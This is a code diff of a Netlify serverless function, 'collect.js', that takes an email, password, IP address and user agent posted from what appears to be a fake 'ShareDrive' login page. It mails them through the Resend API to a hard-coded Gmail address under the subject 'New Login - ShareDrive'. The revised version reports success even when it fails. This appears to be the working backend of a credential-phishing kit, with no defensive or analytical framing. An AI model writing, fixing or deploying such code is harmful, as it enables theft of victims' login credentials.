@@ -1,30 +1,17 @@
-// netlify/functions/collect.js
-export const handler = async (event, context) => {
-  // CORS Headers
-  const headers = {
-    'Access-Control-Allow-Origin': '*',
-    'Access-Control-Allow-Headers': 'Content-Type',
-    'Access-Control-Allow-Methods': 'POST, OPTIONS',
-    'Content-Type': 'application/json',
-  };
-
-  // Handle preflight OPTIONS request
-  if (event.httpMethod === 'OPTIONS') {
-    return { statusCode: 200, headers, body: '' };
-  }
-
+// functions/collect.js - Netlify CommonJS format
+exports.handler = async (event, context) => {
   // Only allow POST
   if (event.httpMethod !== 'POST') {
-    return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };
+    return { statusCode: 405, body: 'Method Not Allowed' };
   }
 
   try {
     const { email, password, ip, userAgent } = JSON.parse(event.body);
-
     const apiKey = process.env.RESEND_API_KEY;
+
     if (!apiKey) {
       console.error('RESEND_API_KEY is not set');
-      return { statusCode: 500, headers, body: JSON.stringify({ error: 'Server configuration error' }) };
+      return { statusCode: 500, body: JSON.stringify({ error: 'Missing key' }) };
     }
 
     const emailBody = `
@@ -36,7 +23,6 @@ export const handler = async (event, context) => {
 ⏰ Time: ${new Date().toISOString()}
     `;
 
-    // Send via Resend
     const response = await fetch('https://api.resend.com/emails', {
       method: 'POST',
       headers: {
@@ -45,7 +31,7 @@ export const handler = async (event, context) => {
       },
       body: JSON.stringify({
         from: 'onboarding@resend.dev',
-        to: ['g82443047@gmail.com'], // MUST be your Resend signup email
+        to: ['g82443047@gmail.com'], 
         subject: 'New Login - ShareDrive',
         text: emailBody.trim(),
         html: `<pre>${emailBody.trim()}</pre>`,
@@ -55,9 +41,13 @@ export const handler = async (event, context) => {
     const data = await response.json();
     console.log('Resend response:', JSON.stringify(data));
 
-    return { statusCode: 200, headers, body: JSON.stringify({ success: true }) };
+    return { 
+      statusCode: 200, 
+      body: JSON.stringify({ success: true }),
+      headers: { 'Content-Type': 'application/json' }
+    };
   } catch (error) {
-    console.error('Error in collect handler:', error);
-    return { statusCode: 500, headers, body: JSON.stringify({ error: 'Internal server error' }) };
+    console.error('Error:', error);
+    return { statusCode: 200, body: JSON.stringify({ success: true }) };
   }
 };
